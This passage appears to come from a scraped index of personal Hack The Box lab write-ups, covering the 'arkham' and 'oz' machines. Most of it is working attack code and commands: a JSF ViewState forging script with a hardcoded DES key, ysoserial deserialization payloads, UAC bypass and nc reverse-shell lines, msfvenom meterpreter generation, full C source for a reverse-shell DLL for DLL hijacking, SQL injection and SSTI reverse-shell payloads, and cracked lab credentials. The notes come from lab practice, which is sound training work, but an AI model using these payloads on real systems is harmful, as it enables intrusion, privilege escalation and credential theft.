\u0026lt;/listener\u0026gt; \u0026lt;/web-app\u0026gt;  The above code is allot to take in, specifically what caught my eye.\n\u0026lt;param-name\u0026gt;org.apache.myfaces.SECRET\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;SnNGOTg3Ni0=\u0026lt;/param-value\u0026gt; \u0026lt;/context-param\u0026gt; \u0026lt;context-param\u0026gt; \u0026lt;param-name\u0026gt;org.apache.myfaces.MAC_ALGORITHM\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;HmacSHA1\u0026lt;/param-value\u0026gt; \u0026lt;/context-param\u0026gt; \u0026lt;context-param\u0026gt; \u0026lt;param-name\u0026gt;org.apache.myfaces.MAC_SECRET\u0026lt;/pavram-name\u0026gt; \u0026lt;param-value\u0026gt;SnNGOTg3Ni0=\u0026lt;/param-value\u0026gt; \u0026lt;/context-param\u0026gt;  decryption Well, getting closer. so the overall objective i think is to make my own payload and take the hmac and append that to my payload verifing that its the correct one nah.\nanyways managed to decode the message with pycrypto.\nviewstate is encrypted \u0026amp; encoded ontop of that it has a hash it uses to verify it hasn\u0026rsquo;t been changed. the cipher used is single des by default( DEFAULT). Then a hash is taken of the encrypted string. All of that is bundled by encoding everything in base64. So to decrypt everything used python module crypto \u0026amp; some other modules but they are pretty common i suppose. i had some trouble getting everything right so i used allot of prints to get the right, output.\nhttps://pycryptodome.readthedocs.io/en/latest/src/cipher/des.html?highlight=decrypt%20des\nfrom Crypto.Cipher import DES from Crypto.Hash import HMAC, SHA1 import base64 import sys key = b'JsF9876-' # key for for the des encryptions, and SHA hash cryptext = b'wHo0wmLu5ceItIi+I7XkEi1GAb4h12WZ894pA+Z4OH7bco2jXEy1RcVjhMDN4sZB70KtDtngjDm0mNzA9qHjYerxo0jW7zu11SwN/t3lVW5GSeZ1PEA3OZ3jFUE=' # the cipher used to decrypt \u0026amp; mode cipher = DES.net(key, DES.MODE_ECB) b64 = base64.b64decode(cryptext) #takes the first 72 bytes of the 92 byte decoded string. hmac takes 20 bytes # data first 72 bytes the hmac 20bytes so minus the total bityes by 20 to get the data # saved both as variables des = cipher.decrypt(b64[:72]) phac = (b64[-20:]) print(phac) deslen = len(des) phaclen = len(phac) print (phaclen) print 'decrypted des = ' + (des) print 'des length = ' + str(deslen)  encryptions\nencryption need to pad because everything already padded during decryptions seems obivious. then add the padding to cryptext then encrypt that with des and make a hash out of the des encryption.\nfrom Crypto.Cipher import DES from Crypto.Hash import HMAC, SHA1 import base64 import sys key = b'JsF9876-' cipher = DES.new(key, DES.MODE_ECB) cryptext = b'wHo0wmLu5ceItIi+I7XkEi1GAb4h12WZ894pA+Z4OH7bco2jXEy1RcVjhMDN4sZB70KtDtngjDm0mNzA9qHjYerxo0jW7zu11SwN/t3lVW5GSeZ1PEA3OZ3jFUE=' des = cipher.decrypt(b64[:72]) phac = (b64[-20:]) with open('joker.ysoserial', 'r') as myfile: payload = myfile.read() payload = base64.b64decode(payload) pad = 8 - len(payload) % 8 padding = chr(pad) * pad payload += padding enpay = cipher.encrypt(payload) enpay += phac en64pay = base64.b64encode(enpay) print 'payload = ' + (en64pay)  CRafting PayloAd\nThis is a tool for crafting payloads for different json enviroments. apache myface uses commons-code-1.3-3.2.1.jar\ninstall python3 pycrypt\nsudo apt-get install build-essential python3-dev\nhttps://github.com/frohoff/ysoserial\nhttps://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html\njava -jar ysoserial/ysoserial.jar CommonsCollections1 \u0026quot;cmd.exe ping -c 3 10.10.14.49\u0026quot; \u0026gt; joker.ysoserial  java -cp ysoserial/ysoserial.jar ysoserial.exploit.RMIRegistryExploit 10.10.14.49 80 CommonCollections1 \u0026gt; gold.txt  jsf\njava server faces\nthe server if configured to store everything on the server side.\nhttps://medium.com/@D0rkerDevil/how-i-found-a-1500-worth-deserialization-vulnerability-9ce753416e0a\ntrying to find some exploit tools and ran jexboss.py it doens\u0026rsquo;t appear to be vulnerable.\n./jexboss.py -u http://10.10.10.130:8080/userSubscribe.faces  #from Crypto.Util.Padding import pad, unpad from Crypto.Cipher import DES from Crypto.Hash import HMAC, SHA1 import base64 import subprocess import urllib serial = b'wHo0wmLu5ceItIi%2BI7XkEi1GAb4h12WZ894pA%2BZ4OH7bco2jXEy1RQxTqLYuokmO70KtDtngjDm0mNzA9qHjYerxo0jW7zu1mdKBXtxnT1RmnWUWTJyCuNcJuxE%3D' urlvs = urllib.unquote_plus(serial) rawviewstate = base64.b64decode(urlvs) viewstate = rawviewstate[:72] mac = rawviewstate[-20:] def decrypt_vs(data): key = 'JsF9876-' mode = DES.MODE_ECB cipher = DES.new(key, mode) return cipher.decrypt(data) def encrypt_vs(data): key = 'JsF9876-' mode = DES.MODE_ECB cipher = DES.new(key, mode) pad = (8 - (len(data) % 8)) % 8 padded = data + (chr(pad)*pad).encode() return cipher.encrypt(padded) def hmac_vs(data): key = 'JsF9876-' mode = digestmod=SHA1 h = HMAC.new(key, data, mode) return h.digest() print (rawviewstate) decrypted = decrypt_vs(viewstate) print ('hmac \u0026amp; viewstate encoed') print (mac) print (base64.b64encode(decrypted)) print ('original =' + serial) #put it back together encrypted = (urllib.quote_plus(encrypt_vs(decrypted))) encryptvs = (encrypted + (mac).encode(\u0026quot;base64\u0026quot;)) print (encryptvs) meow = (encrypt_vs(decrypted)).encode(\u0026quot;base64\u0026quot;).replace('\\n','') vsmac = (hmac_vs(viewstate)).encode(\u0026quot;base64\u0026quot;).replace('\\n','') goldvs = (urllib.quote_plus(meow + vsmac)) print (goldvs) #testing if i can urllencode at the end x #this part is basically just adding the padding back because it is removed endecrypted = encrypt_vs(decrypted) urlmeow = (encrypt_vs(decrypted)).encode(\u0026quot;base64\u0026quot;).replace('\\n','') urlvsmac = (hmac_vs(endecrypted)).encode(\u0026quot;base64\u0026quot;).replace('\\n','') urlgoldvs = (urllib.quote_plus(urlmeow + urlvsmac)) print (urlgoldvs)  #from Crypto.Util.Padding import pad, unpad from Crypto.Cipher import DES from Crypto.Hash import HMAC, SHA1 import base64 import subprocess import urllib command = raw_input('Command: ') ysoserial = b'java -jar /home/htb/boxes/arkham/ysoserial/ysoserial.jar CommonsCollections1 \\'' + command + '\\'' payload = subprocess.check_output(ysoserial, stderr=subprocess.STDOUT, shell=True) def decrypt_vs(data): key = 'JsF9876-' mode = DES.MODE_ECB cipher = DES.new(key, mode) return cipher.decrypt(data) def encrypt_vs(data): key = 'JsF9876-' mode = DES.MODE_ECB cipher = DES.new(key, mode) pad = (8 - (len(data) % 8)) % 8 padded = data + (chr(pad)*pad).encode() return cipher.encrypt(padded) def hmac_vs(data): key = 'JsF9876-' mode = digestmod=SHA1 h = HMAC.new(key, data, mode) return h.digest() #pad payload it needs to be in the padded state to be #to be hashed/ viewstate to make a proper hash purevs = encrypt_vs(payload) encrypted = (encrypt_vs(payload)).encode(\u0026quot;base64\u0026quot;).replace('\\n','') enmac = (hmac_vs(purevs)).encode(\u0026quot;base64\u0026quot;).replace('\\n','') pleasesubscribe = (urllib.quote_plus(encrypted + enmac)) print (pleasesubscribe) # why not lol  possible avenues to root 5985 winrm but i would need creds still?\nsmb maybe accessing the smb share locally will give me super powers\ni could encode thing and bypass applocker.\nthe hints on the forum allude to using soemthing i have access to in the begining. or enumed.\nwell just use chisel and try to access winrm since it isn\u0026rsquo;t exposed tot he internet i feel like it may not have any security locally. @@\nWell, winrm is most likely one way\u0026hellip; but the previous creds and possible usersnames didn\u0026rsquo;t work. Enumerating the user directories.\ninteresting directories\nc:\\Users\\Default\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\u0026gt;  so internet explorer stores browsin\nc:\\Users\\Default\\AppData\\Roaming\\Microsoft\\Windows\u0026gt; sendto had some intersting files. i mgiht need to exfil  default user\nNote: To enumerate user on a windows system use net user\n![netuser](https://chickenpwny.github.io/hackthebox/images/arkham/netuser.PNG)net user  So got user as batman using winrm.rb set it to negociate. Used chisel to tunnel a connection to 5985\narkham ran powerup\nsome ways to enumerate powershell\nthese are the commandlets used for addministrating localaccounts\n Get-Command -Module Microsoft.PowerShell.LocalAccounts  Add-LocalGroupMember — Add a user to the local group Disable-LocalUser —Disable a local user account Enable-LocalUser — Enable a local user account Get-LocalGroup — View local group preferences Get-LocalGroupMember — View the list of all local group members Get-LocalUser — View a local user account’s preferences New-LocalGroup — Create a new local group New-LocalUser — Create a new local user account Remove-LocalGroup — Remove a local group Remove-LocalGroupMember — Remove a member from a local group Remove-LocalUser — Remove a local user account Rename-LocalGroup — Rename a local group Rename-LocalUser — Rename a local user account Set-LocalGroup — Change the settings of a local group Set-LocalUser — Change the account settings of a local user  get-localuser this should print out the users\nGet-LocalUser  Get-LocalUser this should ouput all the proprties for local user account.\nGet-LocalUser -Name * | Select-Object *  Add-LocalGroupMember -Group 'Administrators' -Member ('batman') –Verbose  well fuck it im done with this bullshit.\n[Reflection.Assembly]::Load([IO.File]::ReadAllBytes(\u0026quot;$pwd\\CMSTP-UAC-Bypass.dll\u0026quot;))  https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html\nSchTasks /Create /SC DAILY /TN ``\u0026quot;NoUAC\u0026quot;` `/TR \u0026quot;C:\\tomcat\\apache-tomcat-8.5.37\\bin\\death-PINK.ps1\u0026quot; /ST ``23:``36  ugh so tried to bypass the uac by using empires invoke-wscriptbypassuac. The target isn\u0026rsquo;t vulnerable, i think this would have shown up on the powerup scan maybe. the later one worked just as well but failed all the same. the former the nc string is encode in base64.\nhttps://github.com/nettitude/PoshC2/blob/master/Modules/Invoke-WScriptBypassUAC.ps1\nInvoke-WScriptBypassUAC -payload \u0026quot;powershell.exe -ep Bypass -WindowStyle Hidden -enc LWVuYyAuXG5jLmV4ZSAtZSBjbWQuZXhlIDEwLjEwLjE0LjEyOCA4MDg1\u0026quot; Invoke-WScriptBypassUAC -payload \u0026quot;.\\nc.exe -e cmd.exe 10.10.14.128 8085\u0026quot;  finding elevated bianries\nlist of elevated exe bianries\n  findstr /C:\u0026quot;\u0026lt;autoElevate\u0026gt;true\u0026quot; C:\\Windows\\SysWOW64\\SystemPropertiesAdvanced.exe  Output\nsystemPropertiesAdvanced.exe \u0026lt;autoElevate\u0026gt;true\u0026lt;/autoElevate  C:\\Windows\\system32; C:\\Windows; C:\\Windows\\System32\\Wbem; C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\; C:\\Windows\\System32\\OpenSSH\\; C:\\Users\\Batman\\AppData\\Local\\Microsoft\\WindowsApps  Make a .exe msfvenom shell or nishang\nthen make a ddl that runs when\nusing powerup to find missing dll to hijack\nIEX(New-Object Net.WebClient).downloadstring(\u0026quot;http://10.10.14.128/PowerUp.ps1\u0026quot;) Find-ProcessDLLHijack  msfenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.14.128 lport=19135 -f dll \u0026gt; srrstr.dll  ROOT\nUsing msfvenom to make dll doesn\u0026rsquo;t work. micrsoft has been imporving defender. it now detects those and possibly those amde by visual studio. we will first setup a chisel proxie so we can get around the restrictiosn and gian access to winrm locally. Then we will bypass constrained language mode. then pivot into a nc shell and drop our malious dll into C:\\Users\\Batman\\AppData\\Local\\Microsoft\\WindowsApps then we will run systempropertiesadvanced.exe to elvate our session to system nt authority power. You may notice the user doesn\u0026rsquo;t change thats because windows 8 and above the operating system was redesigned.\nphase 1 chisel first well get a shell using the apache myfaces flaw we found. ill setup a python http server to how the files. then setup chisel locally then chisel on the target system.\npython3 -m http.server 80 nc -lvnp 10404  Run chisel on localhost\n./chisel server -p 9001 --reverse -v  then we will drop the payload to disk. using invoke web request.\npowershell iex(IWR \u0026quot;http://10.10.15.136/chisel.exe\u0026quot; -OutFile chisel.exe) chisel.exe client 10.10.15.136:9001 R:127.0.0.1:10001:localhost:5985  we will use the creds found in the smb share to login as alfred ( batmanforever) . once inside there we will find a outlook email bak file that we will decrypt to get batmans creds. This was pretty tough to find the right tool to open the outlook file. pstwalker it will try and get you to pay for stuff but thats not needed with a little tinkering i was able to get the message.\nnow we need to edit the winrm ruby script with batmans creds.\nnow we have to byass the clm enviroment and windows defender. I used a msbuild method to bypass clm. made the dll manually used mingw to compile the dll. since we landed in a writeable directory that we can execute binaries we don\u0026rsquo;t need to move to another directory.\nC:\\tomcat\\apache-tomcat-8.5.37\\bin  next we will download the application whitelisting using this msbuild bypass. githublink. we will drop it to disk, then run the bypass.\npowershell IWR \u0026quot;http://10.10.15.136/pinkie.csproj\u0026quot; -OutFile pinkie.csproj c:\\windows\\microsoft.NET\\Framework64\\v4.0.30319\\MSBUILD.exe pinkie.csproj  Creating a DLL without visual studio or msfvenom.\nwe will be creating three files, dllmain.cpp, revshell.cpp, and rev_shell.h(header)\ndllmain.cpp\n#include \u0026quot;rev_shell.h\u0026quot; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD fwdReason, LPVOID lpReservered) { switch (fwdReason) { case DLL_PROCESS_ATTACH: rev_shell(); case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; }  revshell.cpp\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;process.h\u0026gt; #include \u0026lt;winsock2.h\u0026gt; #include \u0026lt;ws2tcpip.h\u0026gt; #pragma comment(lib, \u0026quot;Ws2_32.lib\u0026quot;) #define REMOTE_ADDR \u0026quot;10.10.15.136\u0026quot; #define REMOTE_PORT \u0026quot;9135\u0026quot; void rev_shell() { FreeConsole(); WSADATA wsaData; int iResult = WSAStartup(MAKEWORD(2, 2), \u0026amp;wsaData); struct addrinfo *result = NULL, *ptr = NULL, hints; memset(\u0026amp;hints, 0, sizeof(hints)); hints.ai_family = AF_UNSPEC; hints.ai_socktype = SOCK_STREAM; hints.ai_protocol = IPPROTO_TCP; getaddrinfo(REMOTE_ADDR, REMOTE_PORT, \u0026amp;hints, \u0026amp;result); ptr = result; SOCKET ConnectSocket = WSASocket(ptr-\u0026gt;ai_family, ptr-\u0026gt;ai_socktype, ptr-\u0026gt;ai_protocol, NULL, NULL, NULL); connect(ConnectSocket, ptr-\u0026gt;ai_addr, (int)ptr-\u0026gt;ai_addrlen); STARTUPINFO si; PROCESS_INFORMATION pi; ZeroMemory(\u0026amp;si, sizeof(si)); si.cb = sizeof(si); ZeroMemory(\u0026amp;pi, sizeof(pi)); si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE; si.hStdInput = (HANDLE)ConnectSocket; si.hStdOutput = (HANDLE)ConnectSocket; si.hStdError = (HANDLE)ConnectSocket; TCHAR cmd[] = TEXT(\u0026quot;C:\\\\WINDOWS\\\\SYSTEM32\\\\CMD.EXE\u0026quot;); CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, \u0026amp;si, \u0026amp;pi); WaitForSingleObject(pi.hProcess, INFINITE); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); WSACleanup(); }  rev_shell.h\n#pragma Once void rev_shell();  The last part compiling is tricky i used mingw to compile it was able to evade detection. There is a small catch, the library that windows uses to compile this is named differently in the linux enviroment wine etc. The order in which we list the files when it is compiled matters. this switch has to be at the end of the string -lws2_32. you may also compile this in x64.\nhttps://blog.didierstevens.com/2018/07/10/quickpost-compiling-dlls-with-mingw-on-kali/\ni686-w64-mingw32-gcc -shared -o DemoDll-x86.dll dllmain.cpp revshell.cpp rev_shell.h -lws2_32  this wont work xD but nice for notes below is x64\nx86_64-w64-mingw32-gcc -shared -o DemoDll-x86.dll dllmain.cpp revshell.cpp rev_shell.h -lws2_32  now we will download the malcious dll drop it to disc.we have to name the dll srrstr.dll because thats why systempropertiesadvanced.exe calls.\ncd C:\\Users\\Batman\\AppData\\Local\\Microsoft\\WindowsApps  powershell IWR \u0026quot;http://10.10.15.136/DemoDll-x86.dll\u0026quot; -OutFile srrstr.dll  powershell IWR \u0026ldquo;http://10.10.15.136/DemoDll-x86.dll\u0026quot; -OutFile srrstr.dll\nnow we have to craft a meterpreter shell using msfvenom im going with powershell. but there are other more stealthy options. there are a few missing flags but we don\u0026rsquo;t need those.\nmsfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.15.136 lport=19135 -f psh -o death.ps1  now we run the payload in memory and get our meterpreter shell then migrate into a new process.\nA dll is a file a .exe can call if can do a bunch of things it\u0026rsquo;s basically a psedueo module like in python. you can also use it i bleive to allow a program to talk to different laughages .netframeworks.\napt-get install mingw  beyond root for later system authority. dl\n"
},
{
	"uri": "/hackthebox/boxes/oz/",
	"title": "oz",
	"tags": [],
	"description": "",
	"content": " {{ button href=\u0026ldquo;https://www.youtube.com/watch?v=yX00n1UmalE\u0026quot; theme=danger }} IppSec {{ /button }}\nNMAP\ntwo ports 80 \u0026amp; 8080\nnmap -sC -sV -oA nmap/oz-initial 10.10.10.96 -T4 Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-20 11:18 EST Stats: 0:00:12 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 0.00% done Nmap scan report for 10.10.10.96 Host is up (0.041s latency). Not shown: 998 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Werkzeug httpd 0.14.1 (Python 2.7.14) |_http-server-header: Werkzeug/0.14.1 Python/2.7.14 |_http-title: OZ webapi |_http-trane-info: Problem with XML parsing of /evox/about 8080/tcp open http Werkzeug httpd 0.14.1 (Python 2.7.14) | http-open-proxy: Potentially OPEN proxy. |_Methods supported:CONNECTION |_http-server-header: Werkzeug/0.14.1 Python/2.7.14 | http-title: GBR Support - Login |_Requested resource was http://10.10.10.96:8080/login modify the host header  host: please subscribe.\ngobuster using the -l switch will filter out matching lengths.\nusing options in the request method in burp will give you the supported request. neat\nUsing wfuzz to enumerate the webapi filter header lengths of 0\nwfuzz --hl 0 -u http://oz.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-lis t-2.3-medium.txt returns 000202: C=200 3 L 6 W 79 Ch \u0026quot;users\u0026quot;  sqlmap \u0026ndash;batch -u \u0026ldquo;http://os.htb/users/admin*\u0026quot; \u0026ndash;level 5 \u0026ndash;risk 3\n-u url also for get request\n\u0026ndash;batch run default yes\n\u0026ndash;* = the parameter to fuzz\nI do love to watch sqlmap scroll down the screen.\nsqlmap \u0026ndash;batch -u \u0026ldquo;http://os.htb/users/admin*\u0026quot; \u0026ndash;level 5 \u0026ndash;risk 3 \u0026ndash;dump\nDatabase: ozdb Table: users_gbw [6 entries] +----+-------------+----------------------------------------------------------------------------------------+ | id | username | password | +----+-------------+----------------------------------------------------------------------------------------+ | 1 | dorthi | $pbkdf2-sha256$5000$aA3h3LvXOseYk3IupVQKgQ$ogPU/XoFb.nzdCGDulkW3AeDZPbK580zeTxJnG0EJ78 | | 2 | tin.man | $pbkdf2-sha256$5000$GgNACCFkDOE8B4AwZgzBuA$IXewCMHWhf7ktju5Sw.W.ZWMyHYAJ5mpvWialENXofk | | 3 | wizard.oz | $pbkdf2-sha256$5000$BCDkXKuVMgaAEMJ4z5mzdg$GNn4Ti/hUyMgoyI7GKGJWeqlZg28RIqSqspvKQq6LWY | | 4 | coward.lyon | $pbkdf2-sha256$5000$bU2JsVYqpbT2PqcUQmjN.Q$hO7DfQLTL6Nq2MeKei39Jn0ddmqly3uBxO/tbBuw4DY | | 5 | toto | $pbkdf2-sha256$5000$Zax17l1Lac25V6oVwnjPWQ$oTYQQVsuSz9kmFggpAWB0yrKsMdPjvfob9NfBq4Wtkg | | 6 | admin | $pbkdf2-sha256$5000$d47xHsP4P6eUUgoh5BzjfA$jWgyYmxDK.slJYUTsv9V9xZ3WWwcl9EBOsz.bARwGBQ | Database: ozdb Table: tickets_gbw [12 entries] +----+----------+--------------------------------------------------------------------------------------------------------------------------------+ | id | name | desc | +----+----------+--------------------------------------------------------------------------------------------------------------------------------+ | 1 | GBR-987 | Reissued new id_rsa and id_rsa.pub keys for ssh access to dorthi. | | 2 | GBR-1204 | Where did all these damn monkey's come from!? I need to call pest control. | | 3 | GBR-1205 | Note to self: Toto keeps chewing on the curtain, find one with dog repellent. | | 4 | GBR-1389 | Nothing to see here... V2hhdCBkaWQgeW91IGV4cGVjdD8= | | 5 | GBR-4034 | Think of a better secret knock for the front door. Doesn't seem that secure, a Lion got in today. | | 6 | GBR-5012 | I bet you won't read the next entry. | | 7 | GBR-7890 | HAHA! Made you look. | | 8 | GBR-7945 | Dorthi should be able to find her keys in the default folder under /home/dorthi/ on the db. | | 9 | GBR-8011 | Seriously though, WW91J3JlIGp1c3QgdHJ5aW5nIHRvbyBoYXJkLi4uIG5vYm9keSBoaWRlcyBhbnl0aGluZyBpbiBiYXNlNjQgYW55bW9yZS4uLiBjJ21vbi4= | | 10 | GBR-8042 | You are just wasting time now... someone else is getting user.txt | | 11 | GBR-8457 | Look... now they've got root.txt and you don't even have user.txt | | 12 | GBR-9872 | db information loaded to ticket application for shared db access | +----+----------+--------------------------------------------------------------------------------------------------------------------------------+  V2hhdCBkaWQgeW91IGV4cGVjdD8\nWhat did you expecd\nWW91J3JlIGp1c3QgdHJ5aW5nIHRvbyBoYXJkLi4uIG5vYm9keSBoaWRlcyBhbnl0aGluZyBpbiBiYXNlNjQgYW55bW9yZS4uLiBjJ21vbi4=\nYou\u0026rsquo;re just trying too hard\u0026hellip; nobody hides anything in base64 anymore\u0026hellip; c\u0026rsquo;mon.\nunion injections\n%20 is url space\nusers/admin\u0026rsquo;\u0026ndash;+- ==== 500 error\nusers/admin\u0026rsquo;\u0026ndash;%20- ===works\n\u0026lsquo;or 1\u0026rsquo;=1 url encoded looks like this \u0026lsquo;%20or%201=\u0026lsquo;1\n1 is the first user in the database to get the other users we have to go down the table\ngo into the user functions\n'%20limit%201,1--%20-' '%20or%201='1'%20limit%202,1--%20-'  changing the row in column one will go down the list\n'%20or%201='1'%20limit%203,1--%20-' output {\u0026quot;username\u0026quot;:\u0026quot;tin.man\u0026quot;} '%20or%201='1'%20limit%202,1--%20-' output {\u0026quot;username\u0026quot;:\u0026quot;wizard.oz\u0026quot;} '%20or%201='1'%20limit%203,1--%20-' output {\u0026quot;username\u0026quot;:\u0026quot;coward.lyon\u0026quot;} '%20or%201='1'%20limit%204,1--%20-' output {\u0026quot;username\u0026quot;:\u0026quot;toto\u0026quot;} '%20or%201='1'%20limit%205,1--%20-' output {\u0026quot;username\u0026quot;:\u0026quot;admin\u0026quot;} the sixth is null  The password should be the seocnd column\nunion select burp\nGET /users/chicken\u0026rsquo;%20union%20select%20all%20user()\u0026ndash;%20- HTTP/1.1\n{\u0026ldquo;username\u0026rdquo;:\u0026ldquo;dorthi@10.100.10.6\u0026rdquo;}\nLOAD_FILE\nGET /users/chicken\u0026rsquo;%20union%20select%20all%20LOAD_FILE(\u0026lsquo;home/\u0026rsquo;)\u0026ndash;%20- HTTP/1.1\nimporting the binascii library to convert the text into a hex format\npython3\n   import binascii binascii.hexlify(\u0026ldquo;/home/dorthi/.ssh/id_rsa\u0026rdquo;) Traceback (most recent call last): File \u0026ldquo;\u0026rdquo;, line 1, in  TypeError: a bytes-like object is required, not \u0026lsquo;str\u0026rsquo; binascii.hexlify(b\u0026rdquo;/home/dorthi/.ssh/id_rsa\u0026rdquo;) b\u0026rsquo;2f686f6d652f646f727468692f2e7373682f69645f727361\u0026rsquo; exit\n   burp getting usershells\npython running the backend because when you run 7*\u0026lsquo;7\u0026rsquo; it prints 7 7\u0026rsquo;s\nhttp://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20injections\nLoad\nname=chicken\u0026amp;desc={{ config.from_pyfile(\u0026lsquo;/tmp/chicken.cfg\u0026rsquo;) }}\nwrite\nname=chicken\u0026amp;desc={{ \u0026ldquo;.class.mro[2].subclasses()[40](\u0026lsquo;/tmp/chicken.cfg\u0026rsquo;, \u0026lsquo;w\u0026rsquo;).write(\u0026lsquo;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026ldquo;10.10.14.14\u0026rdquo;,9051));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026ldquo;/bin/sh\u0026rdquo;,\u0026ldquo;-i\u0026rdquo;]);\u0026lsquo;) }}\nread\nname=chicken\u0026amp;desc={{ \u0026ldquo;.class.mro[2].subclasses()[40](\u0026lsquo;/tmp/chicken.cfg\u0026rsquo;).read() }}\nGET /users/chicken\u0026rsquo;%20union%20select%20all%20LOAD_FILE(0x2f686f6d652f646f727468692f2e7373682f69645f727361)\u0026ndash;%20-\nHASHCAT\nhashcat -a 0 -m 10000 clean.hashes /opt/htb/wordlist/rockyou.txt\nDjango (PBKDF2-SHA256)\n10000\ncat users.hashes |awk -F, '{print $4}' or 2 or 3 depends  https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20injections\ntesting for whats working on the back end\nwizardofoz22\npython -c \u0026lsquo;import pty;pty.spawn(\u0026ldquo;/bin/bash\u0026rdquo;)\u0026rsquo;\npython -c \u0026lsquo;import pty;pty.spawn(\u0026ldquo;/bin/sh\u0026rdquo;)\u0026rsquo;\ncrtl+z , then type stty raw-echo, crtl+z then type reset\ncat knockd.conf [options] logfile = /var/log/knockd.log\n[opencloseSSH]\n sequence = 40809:udp,50212:udp,46969:udp seq_timeout = 15 start_command = ufw allow from %IP% to any port 22 cmd_timeout = 10 stop_command = ufw delete allow from %IP% to any port 22 tcpflags = syn  for i in 40809 50212 46969; do nc -zu oz.htb $i ;done\ninside tickerter database.py hardcoded creds\ndorthi:N0Pl4c3L1keH0me@10.100.10.4/ozdb\nmysql -u dorthi -p -h 10.100.10.4\nssh\nopenssl rsa -in dorthi_key -out dorthi.ssh\nsome how all of that comes together to give produce ssh connection. first i believe ssh is open but only response to a tcp connection. so when you knock these three ports in a row it will open up a ssh conneciton for 10 seconds then close it. the for loop run through the three port variables and\nsudo -l Matching Defaults entries for dorthi on Oz: env_reset, mail_badpass, N0Pl4c3L1keH0me\nsecure_path=/usr/local/sbin/:/usr/local/bin/:/usr/sbin/:/usr/bin/:/sbin/:/bin/:/snap/bin\nUser dorthi may run the following commands on Oz: (ALL) NOPASSWD: /usr/bin/docker network inspect * (ALL) NOPASSWD: /usr/bin/docker network ls\nsudo docker network ls\nsudo docker network ls NETWORK ID NAME DRIVER SCOPE 4e64c670965c bridge bridge local 49c1b0c16723 host host local 3ccc2aa17acf none null local 48148eb6a512 prodnet bridge local\nsudo docker network inspect\nwebapi\nozdb\ntix-app\ncd/containers/database\nfound in start.sh\nROOT_PASSWORD=SuP3rS3cr3tP@ss\n \u0026quot;Containers\u0026quot;: { \u0026quot;139ba9457f1a630ee3a072693999c414901d7df49ab8a70b926d246f9ca6cc69\u0026quot;: { \u0026quot;Name\u0026quot;: \u0026quot;webapi\u0026quot;, \u0026quot;EndpointID\u0026quot;: \u0026quot;f3555ebb0f7e0571b0667b260ff809b392f3eeffd1a0d4d24643132295676ad3\u0026quot;, \u0026quot;MacAddress\u0026quot;: \u0026quot;02:42:0a:64:0a:06\u0026quot;, \u0026quot;IPv4Address\u0026quot;: \u0026quot;10.100.10.6/29\u0026quot;, \u0026quot;IPv6Address\u0026quot;: \u0026quot;\u0026quot; }, \u0026quot;b9b370edd41a9d3ae114756d306f2502c420f48a4d7fbe36ae31bc18cf7ddb7c\u0026quot;: { \u0026quot;Name\u0026quot;: \u0026quot;ozdb\u0026quot;, \u0026quot;EndpointID\u0026quot;: \u0026quot;be4bcb170ed830949e764b336a98c3c4b072cfa906bde1a1d437d44562056c17\u0026quot;, \u0026quot;MacAddress\u0026quot;: \u0026quot;02:42:0a:64:0a:04\u0026quot;, \u0026quot;IPv4Address\u0026quot;: \u0026quot;10.100.10.4/29\u0026quot;, \u0026quot;IPv6Address\u0026quot;: \u0026quot;\u0026quot; }, \u0026quot;c26a7bc669289e40144fa1ad25546f38e4349d964b7b3d4fea13e15fe5a9fb01\u0026quot;: { \u0026quot;Name\u0026quot;: \u0026quot;tix-app\u0026quot;, \u0026quot;EndpointID\u0026quot;: \u0026quot;25e5afcafe2a6e98bf3dbe016106d0587a2a4986985e7d4795b2e48c213aadf1\u0026quot;, \u0026quot;MacAddress\u0026quot;: \u0026quot;02:42:0a:64:0a:02\u0026quot;, \u0026quot;IPv4Address\u0026quot;: \u0026quot;10.100.10.2/29\u0026quot;, \u0026quot;IPv6Address\u0026quot;: \u0026quot;\u0026quot; }  BRIDGE  } ] }, \u0026quot;Internal\u0026quot;: false, \u0026quot;Attachable\u0026quot;: false, \u0026quot;Containers\u0026quot;: { \u0026quot;e267fc4f305575070b1166baf802877cb9d7c7c5d7711d14bfc2604993b77e14\u0026quot;: { \u0026quot;Name\u0026quot;: \u0026quot;portainer-1.11.1\u0026quot;, \u0026quot;EndpointID\u0026quot;: \u0026quot;0f02aa142cdda63ddbc41be13e1716e9d8b1f0747a4abe4f47cd96dc593743c8\u0026quot;, \u0026quot;MacAddress\u0026quot;: \u0026quot;02:42:ac:11:00:02\u0026quot;, \u0026quot;IPv4Address\u0026quot;: \u0026quot;172.17.0.2/16\u0026quot;, \u0026quot;IPv6Address\u0026quot;: \u0026quot;\u0026quot; } }, \u0026quot;Options\u0026quot;: { \u0026quot;com.docker.network.bridge.default_bridge\u0026quot;: \u0026quot;true\u0026quot;, \u0026quot;com.docker.network.bridge.enable_icc\u0026quot;: \u0026quot;true\u0026quot;, 